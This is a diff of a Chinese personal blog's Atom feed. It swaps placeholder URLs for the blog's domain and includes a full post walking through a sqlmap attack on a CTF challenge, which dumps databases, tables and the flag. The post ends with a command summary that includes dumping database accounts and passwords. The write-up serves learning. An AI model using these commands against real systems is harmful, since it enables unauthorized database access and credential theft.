@@ -3,11 +3,11 @@
   <title>A.binのBlog</title>
   
   
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="https://abinix.top/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
+  <link href="https://abinix.top/"/>
   <updated>2021-06-25T02:44:19.384Z</updated>
-  <id>http://example.com/</id>
+  <id>https://abinix.top/</id>
   
   <author>
     <name>A.bin</name>
@@ -18,8 +18,8 @@
   
   <entry>
     <title>关于SQL注入</title>
-    <link href="http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
-    <id>http://example.com/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
+    <link href="https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/"/>
+    <id>https://abinix.top/2021/05/19/%E5%85%B3%E4%BA%8ESQL%E6%B3%A8%E5%85%A5/</id>
     <published>2021-05-19T12:29:21.000Z</published>
     <updated>2021-06-25T02:44:19.384Z</updated>
     
@@ -34,16 +34,16 @@
     
     
     
-    <category term="-SQL" scheme="http://example.com/tags/SQL/"/>
+    <category term="-SQL" scheme="https://abinix.top/tags/SQL/"/>
     
   </entry>
   
   <entry>
-    <title>发的地方地方打发范德萨发关于SQLmap</title>
-    <link href="http://example.com/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
-    <id>http://example.com/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
+    <title>关于SQLmap</title>
+    <link href="https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/"/>
+    <id>https://abinix.top/2021/05/19/SQLmap%E4%BD%BF%E7%94%A8/</id>
     <published>2021-05-19T12:18:19.000Z</published>
-    <updated>2021-06-29T01:07:40.614Z</updated>
+    <updated>2021-06-29T01:08:29.516Z</updated>
     
     <content type="html"><![CDATA[<h1 id="关于SQLmap"><a href="#关于SQLmap" class="headerlink" title="关于SQLmap"></a>关于SQLmap</h1><p><strong>还是成绩单那个例子</strong></p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” –dbs </p></blockquote><p>tips：因为是post方式，所以构造语句时需要加data=</p><p>– dbs 爆出数据库名称</p><p><img src="https://www.hualigs.cn/image/60a502ed628a0.jpg" alt="24"></p><p>如图：可以看到全部的数据库<img src="https://www.hualigs.cn/image/60a503490307e.jpg" alt="25"></p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>将数据库中的所有表爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf –tables</p></blockquote><p><img src="https://www.hualigs.cn/image/60a50351141ca.jpg" alt="26"></p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>知道了数据库 知道了表 我们将表中的字段名爆出来</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g –columns</p></blockquote><p>得到：</p><p>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p><h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>最后一步 爆字段内容</p><p>构造语句：</p><blockquote><p>sqlmap -u “<a href="http://114.67.246.176:15604/&quot;">http://114.67.246.176:15604/&quot;</a> –data=”id=1” -D skctf -T fl4g -C ‘skctf_flag’ –dump</p></blockquote><p>+—————————————-+<br>| skctf_flag                             |<br>+—————————————-+<br>| flag{aaab401ce593c5d4334e8c565a91b82e} |<br>+—————————————-+</p><h2 id="小结（sqlmap基本命令）"><a href="#小结（sqlmap基本命令）" class="headerlink" title="小结（sqlmap基本命令）"></a>小结（sqlmap基本命令）</h2><ul><li><p>曝出数据库名称 <strong>–dbs</strong></p></li><li><p>查看web当前使用的数据库 <strong>–current -db</strong></p></li><li><p>曝出web数据库使用账户    <strong>–current -user</strong></p></li><li><p>列出数据库所有账户    <strong>–users</strong></p></li><li><p>曝出数据库账号和密码    <strong>–passwords</strong></p></li><li><p>列出数据库中的表  <strong>-D XX –tables</strong> </p><p>(-D：指定数据库名称 XX：数据库名称 –    tables：列出该数据库的表)</p></li><li><p>列出表中的字段 <strong>-D XX -T YY –columns</strong> </p></li></ul><p>（-D指数据库名称 XX指数据库 -T指要列出字段的表  YY指数据库中的表 –columns指字段）</p><ul><li><p>曝字段内容 <strong>-D XX -T YY -C ”a,b,c” –dump</strong> </p><p>(-D指数据库名称 XX指数据库 -T指要列出字段的表 YY指数据库中的表 -C指定要曝的字段 –dump将结果导出)</p></li></ul>]]></content>
     
@@ -57,14 +57,14 @@
     
     
     
-    <category term="-sql" scheme="http://example.com/tags/sql/"/>
+    <category term="-sql" scheme="https://abinix.top/tags/sql/"/>
     
   </entry>
   
   <entry>
     <title>Linux基础指令</title>
-    <link href="http://example.com/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    <id>http://example.com/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+    <link href="https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://abinix.top/2021/04/22/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
     <published>2021-04-22T10:50:00.000Z</published>
     <updated>2021-05-09T06:45:51.583Z</updated>
     
@@ -78,17 +78,17 @@
     
     
     
-    <category term="-Linux" scheme="http://example.com/categories/Linux/"/>
+    <category term="-Linux" scheme="https://abinix.top/categories/Linux/"/>
     
     
-    <category term="-Linux" scheme="http://example.com/tags/Linux/"/>
+    <category term="-Linux" scheme="https://abinix.top/tags/Linux/"/>
     
   </entry>
   
   <entry>
     <title>PHP学习笔记</title>
-    <link href="http://example.com/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    <id>http://example.com/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+    <link href="https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://abinix.top/2021/04/21/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
     <published>2021-04-21T15:50:34.000Z</published>
     <updated>2021-06-25T01:21:03.098Z</updated>
     
@@ -102,15 +102,15 @@
     
     
     
-    <category term="-PHP" scheme="http://example.com/categories/PHP/"/>
+    <category term="-PHP" scheme="https://abinix.top/categories/PHP/"/>
     
     
   </entry>
   
   <entry>
     <title>爬虫与面向对象爬虫</title>
-    <link href="http://example.com/2021/04/21/%E7%88%AC%E8%99%AB/"/>
-    <id>http://example.com/2021/04/21/%E7%88%AC%E8%99%AB/</id>
+    <link href="https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/"/>
+    <id>https://abinix.top/2021/04/21/%E7%88%AC%E8%99%AB/</id>
     <published>2021-04-21T10:50:00.000Z</published>
     <updated>2021-06-25T02:43:38.096Z</updated>
     
@@ -124,10 +124,10 @@
     
     
     
-    <category term="-Python" scheme="http://example.com/categories/Python/"/>
+    <category term="-Python" scheme="https://abinix.top/categories/Python/"/>
     
     
-    <category term="-爬虫 -面向对象" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
+    <category term="-爬虫 -面向对象" scheme="https://abinix.top/tags/%E7%88%AC%E8%99%AB-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
     
   </entry>
   
